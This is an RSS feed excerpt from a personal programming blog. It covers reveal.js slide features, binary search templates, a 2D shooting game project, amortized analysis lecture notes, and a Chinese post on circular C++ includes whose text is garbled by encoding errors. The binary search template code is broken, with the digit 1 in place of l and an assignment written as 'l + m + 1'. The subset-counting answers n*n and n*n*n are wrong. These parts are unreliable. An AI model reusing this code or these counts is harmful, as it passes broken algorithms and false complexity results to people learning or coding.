&lt;hr>
&lt;h2 id="code-highlighting">Code Highlighting&lt;/h2>
&lt;p>Inline code: &lt;code>variable&lt;/code>&lt;/p>
&lt;p>Code block:&lt;/p>
&lt;pre>&lt;code class="language-python">porridge = &amp;quot;blueberry&amp;quot;
if porridge == &amp;quot;blueberry&amp;quot;:
print(&amp;quot;Eating...&amp;quot;)
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h2 id="math">Math&lt;/h2>
&lt;p>In-line math: $x + y = z$&lt;/p>
&lt;p>Block math:&lt;/p>
&lt;p>$$
f\left( x \right) = ;\frac{{2\left( {x + 4} \right)\left( {x - 4} \right)}}{{\left( {x + 4} \right)\left( {x + 1} \right)}}
$$&lt;/p>
&lt;hr>
&lt;h2 id="fragments">Fragments&lt;/h2>
&lt;p>Make content appear incrementally&lt;/p>
&lt;pre>&lt;code>{{% fragment %}} One {{% /fragment %}}
{{% fragment %}} **Two** {{% /fragment %}}
{{% fragment %}} Three {{% /fragment %}}
&lt;/code>&lt;/pre>
&lt;p>Press &lt;code>Space&lt;/code> to play!&lt;/p>
&lt;p>&lt;span class="fragment " >
One
&lt;/span>
&lt;span class="fragment " >
&lt;strong>Two&lt;/strong>
&lt;/span>
&lt;span class="fragment " >
Three
&lt;/span>&lt;/p>
&lt;hr>
&lt;p>A fragment can accept two optional parameters:&lt;/p>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>: use a custom style (requires definition in custom CSS)&lt;/li>
&lt;li>&lt;code>weight&lt;/code>: sets the order in which a fragment appears&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="speaker-notes">Speaker Notes&lt;/h2>
&lt;p>Add speaker notes to your presentation&lt;/p>
&lt;pre>&lt;code class="language-markdown">{{% speaker_note %}}
- Only the speaker can read these notes
- Press `S` key to view
{{% /speaker_note %}}
&lt;/code>&lt;/pre>
&lt;p>Press the &lt;code>S&lt;/code> key to view the speaker notes!&lt;/p>
&lt;aside class="notes">
&lt;ul>
&lt;li>Only the speaker can read these notes&lt;/li>
&lt;li>Press &lt;code>S&lt;/code> key to view&lt;/li>
&lt;/ul>
&lt;/aside>
&lt;hr>
&lt;h2 id="themes">Themes&lt;/h2>
&lt;ul>
&lt;li>black: Black background, white text, blue links (default)&lt;/li>
&lt;li>white: White background, black text, blue links&lt;/li>
&lt;li>league: Gray background, white text, blue links&lt;/li>
&lt;li>beige: Beige background, dark text, brown links&lt;/li>
&lt;li>sky: Blue background, thin dark text, blue links&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ul>
&lt;li>night: Black background, thick white text, orange links&lt;/li>
&lt;li>serif: Cappuccino background, gray text, brown links&lt;/li>
&lt;li>simple: White background, black text, blue links&lt;/li>
&lt;li>solarized: Cream-colored background, dark green text, blue links&lt;/li>
&lt;/ul>
&lt;hr>
&lt;section data-noprocess data-shortcode-slide
data-background-image="/img/boards.jpg"
>
&lt;h2 id="custom-slide">Custom Slide&lt;/h2>
&lt;p>Customize the slide style and background&lt;/p>
&lt;pre>&lt;code class="language-markdown">{{&amp;lt; slide background-image=&amp;quot;/img/boards.jpg&amp;quot; &amp;gt;}}
{{&amp;lt; slide background-color=&amp;quot;#0000FF&amp;quot; &amp;gt;}}
{{&amp;lt; slide class=&amp;quot;my-style&amp;quot; &amp;gt;}}
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h2 id="custom-css-example">Custom CSS Example&lt;/h2>
&lt;p>Let&amp;rsquo;s make headers navy colored.&lt;/p>
&lt;p>Create &lt;code>assets/css/reveal_custom.css&lt;/code> with:&lt;/p>
&lt;pre>&lt;code class="language-css">.reveal section h1,
.reveal section h2,
.reveal section h3 {
color: navy;
}
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h1 id="questions">Questions?&lt;/h1>
&lt;p>
&lt;a href="https://spectrum.chat/academic" target="_blank" rel="noopener">Ask&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://sourcethemes.com/academic/docs/managing-content/#create-slides" target="_blank" rel="noopener">Documentation&lt;/a>&lt;/p></description></item><item><title>Leetcode Algorithms. Binary Search</title><link>http://www.guozet.me/post/Algorithms-Binary-Search/</link><pubDate>Tue, 15 Jan 2019 21:52:04 +0000</pubDate><guid>http://www.guozet.me/post/Algorithms-Binary-Search/</guid><description>&lt;blockquote>
&lt;p>All the pictures in this post are coming from the video:
&lt;a href="https://www.youtube.com/watch?v=v57lNF2mb_s" target="_blank" rel="noopener">è±è±é± LeetCode Binary Search - å·é¢æ¾å·¥ä½ SP5&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>The feature for the Binary Search is: &lt;strong>Fast, Fast, Fast&lt;/strong>. O(log(n))&lt;/p>
&lt;h1 id="what-is-binary-search">What is Binary Search?&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorithms-Binary-Search/2019-01-15-21-57-59.png" alt="">&lt;/p>
&lt;p>The requirment for the Binary Search is the &lt;strong>sorted input data&lt;/strong>.&lt;/p>
&lt;p>Each node needs to make decision go to left or right. For the Binary Search method, the input data will include three partition: &lt;strong>Mid, left array, right array&lt;/strong>.&lt;/p>
&lt;ul>
&lt;li>If the mid number is less than the target number, then go to right array to find the target number.&lt;/li>
&lt;li>If the mid number is larger than the target number, then go to left array to find the target number.&lt;/li>
&lt;/ul>
&lt;p>When you go to the left or right way, you can choose the recursive function or not recursive function to solve it.&lt;/p>
&lt;p>The answer for this question is that the last mid point is the target number which you want to find if there is a target number in the array. If there is no target number in the array, when you find the last mid number and then you can return false or use this number to do something.&lt;/p>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="why-we-need-binary-search">Why we need Binary Search.&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorithms-Binary-Search/2019-01-15-22-06-06.png" alt="">&lt;/p>
&lt;p>There are some states for the above picture:&lt;/p>
&lt;ul>
&lt;li>The O(eval) is the time to compare the mid number with the target number and the search space need to move to left part or right part. It may be: O(1), O(n), or O(logn).&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>SO, you can use the input dataset range to choose which mothod you can use to solve this problem.&lt;/strong> There are two tips which you can use to think which method is good for you to solve this problem.&lt;/p>
&lt;!-- TODO: Wathc the video to add the note for how we can choose a method to solve the problem. -->
&lt;hr>
&lt;h1 id="template">Template&lt;/h1>
&lt;h2 id="template-1-unique-and-sorted-elements">Template 1: Unique and sorted elements&lt;/h2>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorithms-Binary-Search/2019-01-15-22-15-33.png" alt="">&lt;/p>
&lt;p>Include the left data, but not include the right side.&lt;/p>
&lt;pre>&lt;code class="language-python">def binary_search(1,r):
while l &amp;lt; r:
m = 1 + (r-1) // 2
if f(m): return m #optional
if g(m):
r = m
else:
l + m + 1
return l #or not find, return the min number
&lt;/code>&lt;/pre>
&lt;p>As the above picture, if the input element is unique and sorted, then we can easily use this template to deal with these similar problems. Like the example 1.&lt;/p>
&lt;p>&lt;strong>If the Input data&amp;rsquo;s element is not unique. And it have repetitive numbers.&lt;/strong>&lt;/p>
&lt;h2 id="template-2-repetitive-and-sorted-elements">Template 2: Repetitive and sorted elements&lt;/h2>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorithms-Binary-Search/2019-01-15-22-34-55.png" alt="">&lt;/p>
&lt;p>The lower_bound function will return the first index of i, such that A[i] &amp;gt;= x, So, when you find it, you need to check out if this A[i] may not = x. If the index &amp;gt; len, then there is no number &amp;gt; this.&lt;/p>
&lt;p>&lt;strong>Example&lt;/strong>&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorithms-Binary-Search/2019-01-15-22-44-18.png" alt="">&lt;/p>
&lt;p>&lt;strong>Leetcode 69&lt;/strong>&lt;/p>
&lt;p>It is not way to find the real number to fit the requrtment. So, we can find the number the first time bigger than the input.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorithms-Binary-Search/2019-01-15-22-47-51.png" alt="">&lt;/p></description></item><item><title>A 2-D Shooting Game</title><link>http://www.guozet.me/post/A-2-D-Shooting-Game/</link><pubDate>Tue, 15 Jan 2019 19:55:15 +0000</pubDate><guid>http://www.guozet.me/post/A-2-D-Shooting-Game/</guid><description>&lt;p>I would like to build a 2D game with the hero game. This game should have these features. (Sprite source: The images which in the asset are all comes from Google image and they all for free.)&lt;/p>
&lt;ul>
&lt;li>The hero (player) can attack each smart sprite.&lt;/li>
&lt;li>The smart sprite can attack the hero, and both of them have the attack action. And the smart sprite also needs to avoid the player&amp;rsquo;s attack.&lt;/li>
&lt;li>Keep score: 1.how fast the hero kills all of the smart sprites. 2.how many drops of blood the hero lost in this game.&lt;/li>
&lt;li>Conclude: Use the surplus blood and times to calculate.&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Source Code:&lt;/strong>
&lt;a href="https://github.com/guozetang/2D-Game-Lodmani" target="_blank" rel="noopener">Github&lt;/a>&lt;/p>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="project-introduce">Project introduce&lt;/h1>
&lt;p>Build a 2-D game engine construction. Use this engine to implement 2D game which has a player object, HUD, collision detection, and explosions features.&lt;/p>
&lt;ul>
&lt;li>Build a playable game with a player object, HUD, AI, and collision detection.&lt;/li>
&lt;li>Data-Driven: The game must be data driven so that we can read game constants from an XML file.&lt;/li>
&lt;li>Object Pool: Use seven design patterns in this project to build this 2-D game.&lt;/li>
&lt;li>Build HUD with F1 and the HUD should display (1) the fps, and (2) info about how to move the player object&lt;/li>
&lt;/ul>
&lt;p>
&lt;a href="https://youtu.be/X7uQuaB9wNA" target="_blank" rel="noopener">Youtubu Video&lt;/a>&lt;/p>
&lt;p>{% youtube X7uQuaB9wNA %}&lt;/p>
&lt;hr>
&lt;h1 id="games-features">Games features&lt;/h1>
&lt;p>There are two main features in this project. The first thing is the AI and Collision Detection. The other thing is the Pool and Projectiles.&lt;/p>
&lt;h2 id="ai-and-collision-detection">AI and Collision Detection}&lt;/h2>
&lt;h3 id="build-the-player">Build the player&lt;/h3>
&lt;p>Before we do the AI and collision detection, we need to build the player firstly. I just create the player class inherit from the drawable class.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-39-34.png" alt="">&lt;/p>
&lt;p>I have completed seven actions for the player. These actions include idle, walking, jumping, running, jump attacking, attack1, and attack2. After that, the player can control the player to do these activities in the game.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-37-29.png" alt="">&lt;/p>
&lt;h3 id="ai">AI&lt;/h3>
&lt;p>I choice the observed pattern to make the smart sprites to avoid the collision with the player. So as the code in the followed, the player to notify smart sprites of its position. After that, the smart sprite can avoid the player when their distance is less than the setting.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-40-34.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-40-43.png" alt="">&lt;/p>
&lt;p>So, the smart sprites change the direction if the smart sprites get the notification from the player and calculate their distance between them and player if it less than the set distance. As the picture in the followed. Some pink bird changes the direction before they collide with the player.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-41-02.png" alt="">&lt;/p>
&lt;h3 id="collision-detection">Collision Detection&lt;/h3>
&lt;p>When the distance between the player and the smart sprite is collied, they will be explosive. As the followed picture.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-41-27.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-41-41.png" alt="">&lt;/p>
&lt;h2 id="pool-and-projectiles">Pool and Projectiles&lt;/h2>
&lt;p>Build pool and projectiles to control the bullet numbers. In addition, I also build a HUD to display the bullet information included the active bullet numbers and the free bullet numbers. This information is on the right side in the picture as followed.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/projects/2dgame/2019-01-10-17-41-55.png" alt="">&lt;/p></description></item><item><title>Algorim Lecture 2-Amortized Analysis</title><link>http://www.guozet.me/post/Algorim-Lecture-2/</link><pubDate>Tue, 15 Jan 2019 14:47:20 +0000</pubDate><guid>http://www.guozet.me/post/Algorim-Lecture-2/</guid><description>&lt;blockquote>
&lt;p>Amortized Analysis: Adding Things in Smart ways.&lt;/p>
&lt;/blockquote>
&lt;p>Lots of analyses get easier when you add things together after re-grouping them in smart ways.&lt;/p>
&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;h2 id="example-think-about-an-algorithm-from-the-perspective-of-a-data-element">Example: Think about an Algorithm from the Perspective of a Data Element&amp;hellip;&lt;/h2>
&lt;p>&lt;strong>Example: Merge Sort&lt;/strong>&lt;/p>
&lt;p>It takes Î(n) time to merge two sorted lists of conbined length n.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-26-36.png" alt="">&lt;/p>
&lt;p>Think about the runtime level by level. Each level, the runtime is O(n). Each element have one time to merge.&lt;/p>
&lt;p>If I am is one element, one element runtime is the O(logn).&lt;/p>
&lt;p>&lt;strong>How much of work in the function for one element.&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Figure out &lt;code>how much work / running times is spent on a single generic element of data&lt;/code> during the course of the algorithm.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Add this up to get the total running time. (Compared to adding up the time spent on each &amp;ldquo;operation&amp;rdquo;, summed over each operation in chronological order)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;h2 id="example-enumerating-subsets">Example: Enumerating Subsets&lt;/h2>
&lt;p>counter = 0&lt;/p>
&lt;pre>&lt;code>For all subsets S â {1, 2, 3, 4 ... n},
increment counter.
&lt;/code>&lt;/pre>
&lt;p>What is the value of counter at the end of execution?&lt;/p>
&lt;blockquote>
&lt;p>Counter = n*n&lt;/p>
&lt;/blockquote>
&lt;p>Just two steps for each element, in the subset or not in the subset.&lt;/p>
&lt;p>Think about the next one:&lt;/p>
&lt;pre>&lt;code>For all subsets S â {1, 2, 3, 4 ... n},
For all subsets T â S
Increment Counter
&lt;/code>&lt;/pre>
&lt;p>Now, what is the value of counter at the end of execution?&lt;/p>
&lt;p>If you thinking about the each subset, this is a confused way because some subsets are big and others are small. By this question, we can thing about the element by data.&lt;/p>
&lt;p>So, each element can be in three ways: In S but not T, In S and T, not in S and T.&lt;/p>
&lt;blockquote>
&lt;p>Counter: n * n * n&lt;/p>
&lt;/blockquote>
&lt;h2 id="example-domination-radius">Example: Domination Radius&lt;/h2>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-42-39.png" alt="">&lt;/p>
&lt;ul>
&lt;li>Given the heights of N individuals standing in a line.&lt;/li>
&lt;li>Goal: Find the domination radius of each individual.&lt;/li>
&lt;/ul>
&lt;p>In this problem, each one will expand both left and right sides. Then, this solution need &lt;code>n&lt;/code> expand time in the code. However, we want the solve this question in O(nlog n)&lt;/p>
&lt;p>&lt;strong>Solution 1: Simple algorithm:&lt;/strong> from each element, scan left until blocked, then scan right until blocked.&lt;/p>
&lt;blockquote>
&lt;p>Running times: O($n^2$) worst-case&lt;/p>
&lt;/blockquote>
&lt;p>There is an issue with this solution, if the element have been sorted and you go to the wrong way firstly, then you will get into trouble.&lt;/p>
&lt;p>&lt;strong>Solution 2: Refinement-&lt;/strong> From each element, scan left and right simultaneously until blocked.&lt;/p>
&lt;blockquote>
&lt;p>Running times: O($n^2$) worst-case&lt;/p>
&lt;/blockquote>
&lt;p>For each element in this array, they may have different worst time. The tallest one have the different worst time with the shortest one. The very tall people may spend a lot of works. and the lower one may only spend a few works. So, how we can get the worst-time for this solution, different element have the different worst-time in this case.
Their behaivir is totoally different.&lt;/p>
&lt;p>High-Work: Scan $\geq$ D, So, total: O($ \frac{n}{D}*n $ )&lt;/p>
&lt;p>Low-Work: Scan $\leq$ D (the work per element), So,total: O(n*D)&lt;/p>
&lt;p>n is the # of the number of element in the array, so the worst work for each element is &lt;code>n&lt;/code>. And How many elements for the high works: n/D because if the D is the each high-work element&amp;rsquo;s interval. If the interval is less than D, then the scan &amp;gt; D is error. THe number of high element is n/D&lt;/p>
&lt;p>From the above, the total running times: O($\frac{n^2}{D} + nD$), in this case, if we choose the D is with small, the first value will be very big. However, if we choose the D is very big, the second value will be very big even though the first value change to the small value. What is the best way we can get the best running times?&lt;/p>
&lt;p>When the $D = \sqrt{n}$, we can get the best running times: O($n^{1.5} + n^{1.5}$) = O($2*n^{1.5}$)&lt;/p>
&lt;p>In this case, if we have a sorted array:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-17-15-15-41.png" alt="">&lt;/p>
&lt;p>The running times is:&lt;/p>
&lt;p>$1 + 2 + 3 + &amp;hellip; + n = \frac{n(n+1)}{2} = \Theta(n^2)$&lt;/p>
&lt;p>Now, let&amp;rsquo;s us to thing about how to build these element more than three groups.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Work/Element&lt;/th>
&lt;th>Range&lt;/th>
&lt;th>Max Number of Element&lt;/th>
&lt;th>Total&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>First Group&lt;/td>
&lt;td>[n/2, n)&lt;/td>
&lt;td>2 of them&lt;/td>
&lt;td>O(n)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Second Group&lt;/td>
&lt;td>[n/4, n/2)&lt;/td>
&lt;td>4 of them&lt;/td>
&lt;td>O(n)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Third Group&lt;/td>
&lt;td>[n/8, n/4)&lt;/td>
&lt;td>8 of them&lt;/td>
&lt;td>O(n)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;hellip;&lt;/td>
&lt;td>&amp;hellip;&lt;/td>
&lt;td>&amp;hellip;&lt;/td>
&lt;td>&amp;hellip;&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>So, in this case, we get the total times: O(nlog n)&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-24-12.png" alt="">&lt;/p>
&lt;hr>
&lt;h1 id="re-sizing-memory-blocks">Re-Sizing Memory Blocks&lt;/h1>
&lt;p>There are some questions for the Re-Sizing Memory Blocks:&lt;/p>
&lt;ul>
&lt;li>Since Memory blocks often cannot expand after allocation, what do we do when a memory block fills up?&lt;/li>
&lt;li>For example, suppose we allocate 100 words of memory space for a stack (implemented as an array), but then realize we have more than 100 elements to push onto the stack!&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Of course, if we use a linked list would have solved this problem, but suppose we really want to use arrays instead&amp;hellip;)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Some exixt solution for this problem&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>A common technique for block expansion: Whenever our current block fills up, allocate a new block of twice its size and transfer the contents to the new block.&lt;/li>
&lt;li>Unforturnaely, now some of our push operations will be quite slow!
&lt;ul>
&lt;li>Most push operations take only O(1) time.&lt;/li>
&lt;li>However, a push operation &lt;strong>resulting in an expansion&lt;/strong> (and a copy of the n elements currently in the stack) will take $\Theta$(n) times.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>So, what is the runtimes for the push.(It is hard to say.)&lt;/p>
&lt;p>Push has a somewhat not-uniform running time profile:&lt;/p>
&lt;ul>
&lt;li>O(1) almost always&lt;/li>
&lt;li>Except $\Theta$(N) every now and then.&lt;/li>
&lt;/ul>
&lt;p>But just saying the running time is &amp;ldquo;$\Theta$(N) in the worst case&amp;rdquo; doesn&amp;rsquo;t tell the whole story..&lt;/p>
&lt;ul>
&lt;li>Doesn&amp;rsquo;t do the structure justive.&lt;/li>
&lt;li>People might be scared to use it for large input sizes&amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Most times, it is so fast.&lt;/strong> So, for these case, we need a new way to descript this case, it&amp;rsquo;s bad to misunderstanding for the only past descript.&lt;/p>
&lt;h2 id="how-much-does-each-push-actually-cost">How much does each push actually cost?&lt;/h2>
&lt;h3 id="if-we-insert-the-element-in-the-stackarray">If we insert the element in the stack(array)&lt;/h3>
&lt;p>And, what about if we charge ourselves 3 units of work per operation instead&amp;hellip;?&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-43-23.png" alt="">&lt;/p>
&lt;p>&lt;strong>True&lt;/strong> cumulative cost after any sequence of k operations is upper bounded by &lt;code>fictitious&lt;/code> cumulative cost of &lt;code>3k&lt;/code>&amp;hellip;&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-43-52.png" alt="">&lt;/p>
&lt;p>And, if we change something:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-29-42.png" alt="">&lt;/p>
&lt;p>So, how different is our version of push from a version that takes 3 units in the worst case?&lt;/p>
&lt;h2 id="amortized-analysis">Amortized Analysis&lt;/h2>
&lt;p>Any sequence of k pushes takes O(k) worst-case time, so we say that push takes O(1) &lt;strong>amortized time&lt;/strong>.&lt;/p>
&lt;p>&lt;strong>On average&lt;/strong>, over the entire sequence, each individual push therefore takes O(1) time.&lt;/p>
&lt;p>In general, an operation runs in O(f(n)) amortized time if any sequence of k such operations runs in O(k * f(n)) time.&lt;/p>
&lt;h3 id="the-motivation-for-the-amortized-analysis">The motivation for the Amortized Analysis&lt;/h3>
&lt;p>Amortized analysis is an ideal way to characterize the worst-case running time of operations with highly non-uniform performance.&lt;/p>
&lt;p>It is still &lt;code>worst-case&lt;/code> analysis, just averaged over an arbitrary sequence of operations. And, it gives us a much clearer picture of the true performance of a data structure that more faithfully describes the true performance. (For example, $\Theta(N)$ worst case vs. O(1) amortized.)&lt;/p>
&lt;p>&lt;strong>Example&lt;/strong>&lt;/p>
&lt;p>Suppose we have 2 implementations of a data structure to choose from:&lt;/p>
&lt;ul>
&lt;li>O(log n) worst-case time / operation&lt;/li>
&lt;li>O(log n) amortized time / operation&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>There is no difference if we use either A or B as part of &lt;strong>a larger algorithm&lt;/strong>. For example, if our algorithm makes n calls to the data structure, the running time is O(n log n) in either case.&lt;/p>
&lt;/blockquote>
&lt;p>The choice between A and B only matters in &lt;strong>a &amp;ldquo;real-time&amp;rdquo; setting&lt;/strong> when the response time of an &lt;strong>individual operation&lt;/strong> is important.&lt;/p>
&lt;p>If the dataset is not big, you want to as fast as they can. Then choose the first one.&lt;/p>
&lt;h3 id="generalizing-to-multiple-operations">Generalizing to Multiple operations&lt;/h3>
&lt;p>We say an operation A requires O(f(n)) amortized time if any sequence of k invocations of A requires O(k f(n)) time in the worst case.&lt;/p>
&lt;p>We say operations A and B have amortized running times of O($f_A(n)$) and O($f_B(n)$) if any sequence containing $K_A$ invocations of A and $K_B$ invocations of B requires: $O(K_A f_A(n) + K_B f_B(n))$. And so on, for 3 or more operations&amp;hellip;&lt;/p>
&lt;h3 id="a-simple-but-often-limited-method-for-amortized-analysis">A simple, but often limited, method for Amortized analysis&lt;/h3>
&lt;p>Compute the worst-case running time for an arbitrary sequence of k operations, then divide by k. Unfortunately, it is often hard to bound the running time of an arbitrary sequence of k operations.(Especially if the operations are of several types &amp;ndash; for example, &amp;ldquo;push&amp;rdquo; and &amp;ldquo;pop&amp;rdquo;)&amp;hellip;&lt;/p>
&lt;hr>
&lt;h2 id="accounting-method-analysis">Accounting Method Analysis&lt;/h2>
&lt;p>&lt;strong>Example Using Memory Re-Sizing&lt;/strong>&lt;/p>
&lt;p>Charge 3 units (i.e., O(1) amortized time) for each push operation.&lt;/p>
&lt;ul>
&lt;li>1 unit for the immediate push.&lt;/li>
&lt;li>&amp;ldquo;$2&amp;rdquo; credit for future memory expansions.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-30-42.png" alt="">&lt;/p>
&lt;p>You charged upfront and use it later. Ans the dataset is not changed. Just make this quesiton like you pay for the car fees which we talked before.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-14-33-04.png" alt="">&lt;/p>
&lt;p>There are the same thing, pay for the cost which you may be used in the future. The data you need pay for is not changed, just make each step siilar.&lt;/p>
&lt;h3 id="what-about-adding-pop---will-this-work-well">What about adding &amp;ldquo;Pop&amp;rdquo; - Will this work well?&lt;/h3>
&lt;p>When the buffer fills up due to too many pushes, double its size. And when the buffer becomes less than half full due to too many pops, halve its size. We want think about how to make the most space in the buffer are effective.&lt;/p>
&lt;blockquote>
&lt;p>If we use the half of the buffer as the line to detect double its size or half its size, this buffer may double and half frequently if these data size close with the half of buffer size.&lt;/p>
&lt;/blockquote>
&lt;p>Change to When the buffer becomes less than one quarter full due to too many pops, halve its size. When the buffer fills up due to too many pushes, double its size.&lt;/p>
&lt;h4 id="example-the-min-queue">Example: The Min-Queue&lt;/h4>
&lt;p>Using either a linked list or a (circular) array, it is easy to implement a FIFO queue supporting the insert and delete operations both in O(1) worst-case time.&lt;/p>
&lt;p>Suppose that we also want to support a find-min-operation, which returns the value of the minimum element currently present in the queue.&lt;strong>It is possible to implement a &amp;ldquo;min-queue&amp;rdquo; supporting insert, delete, and find-min all in O(1) worst-case time?&lt;/strong>&lt;/p>
&lt;p>If we use a new structure about the Min-Queue as a Pair of &amp;ldquo;Back-to-Back&amp;rdquo; Min-Stacks.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-16-33-05.png" alt="">&lt;/p>
&lt;p>We insert the data at the blue side, and delete the element at the yellow side. And, what will waste a lot of time in this case?&lt;/p>
&lt;blockquote>
&lt;p>When yellow stack becomes empty, spend O(n) time and transfer the contents of blue stack into the yellow stacks. Just like the blue stack pop and the yellow stack push the element in the stack.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2019-01-15-Algorim-Lecture-2/2019-01-20-16-34-36.png" alt="">&lt;/p></description></item><item><title>C++ä¸­ä¸¤ä¸ªç±»ç¸äºå¼ç¨çæåµ</title><link>http://www.guozet.me/post/C++-Two-Class-include-other-one/</link><pubDate>Tue, 27 Nov 2018 10:14:31 +0000</pubDate><guid>http://www.guozet.me/post/C++-Two-Class-include-other-one/</guid><description>&lt;h1 id="question">Question&lt;/h1>
&lt;p>ç°å¨æä¸¤ä¸ªç±»AåBéè¦å®ä¹ï¼å®ä¹Açæ¶åéè¦ç¨å°Bï¼å®ä¹Bçæ¶åéè¦ç¨å°Aã&lt;/p>
&lt;pre>&lt;code class="language-cpp">//A.h
#include &amp;quot;B.h&amp;quot;
class A
{
B b;
};
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-cpp">//B.h
#include &amp;quot;A.h&amp;quot;
class B
{
A a;
};
&lt;/code>&lt;/pre>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="analyze">Analyze&lt;/h1>
&lt;p>AåBçå®ä¹åè°ç¨é½æ¾å¨ä¸ä¸ªæä»¶ä¸­è¯å®æ¯ä¸å¯ä»¥çï¼è¿æ ·å°±ä¼é æä¸¤ä¸ªå¾ªç¯è°ç¨çæ­»å¾ªç¯ã&lt;/p>
&lt;p>æ ¹æ¬åå æ¯ï¼å®ä¹Açæ¶åï¼Açéé¢æBï¼æä»¥å°±éè¦å»æ¥çBçå ç©ºé´å¤§å°ï¼ä½æ¯æ¥ççæ¶åååç°éè¦ç¥éAçå ç©ºé´å¤§å°ï¼é ææ­»å¾ªç¯ã&lt;/p>
&lt;hr>
&lt;h1 id="solution">Solution&lt;/h1>
&lt;ul>
&lt;li>åä¸¤ä¸ªå¤´æä»¶A.håB.håå«ç¨äºå£°æç±»AåBï¼&lt;/li>
&lt;li>åä¸¤ä¸ª.cppæä»¶åå«ç¨äºå®ä¹ç±»AåBï¼&lt;/li>
&lt;li>å¨Açå¤´æä»¶ä¸­å¯¼å¥Bçå¤´æä»¶ï¼&lt;/li>
&lt;li>å¨Bçå¤´æä»¶ä¸­ä¸å¯¼å¥Açå¤´æä»¶ï¼ä½æ¯ç¨extern çæ¹å¼å£°æç±»Aï¼å¹¶ä¸ï¼å¨Bä¸­ä½¿ç¨Açæ¶åè¦ç¨æéçå½¢å¼ã&lt;/li>
&lt;/ul>
&lt;p>åçï¼å¨Bä¸­ç¨æéè°ç¨Aï¼é£ä¹å¨Aéè¦ç¥éBå ç©ºé´å¤§å°çæ¶åï¼å°±ä¼å»æ¾å°Bçå®ä¹æä»¶ï¼è½ç¶Bçå®ä¹æä»¶ä¸­å¹¶æ²¡æå¯¼å¥Açå¤´æä»¶ï¼ä¸ç¥éAçå ç©ºé´å¤§å°ï¼ä½æ¯ç±äºå¨Bä¸­è°ç¨Açæ¶åç¨çæéå½¢å¼ï¼Båªç¥éæéå 4ä¸ªå­èå°±å¯ä»¥ï¼ä¸éè¦ç¥éAçæ­£å ç©ºé´å¤§å°ï¼ä¹å°±æ¯è¯´ï¼Aä¹æ¯ç¥éBçå ç©ºé´å¤§å°çã&lt;/p>
&lt;p>åèåå®¢ï¼&lt;/p>
&lt;ul>
&lt;li>
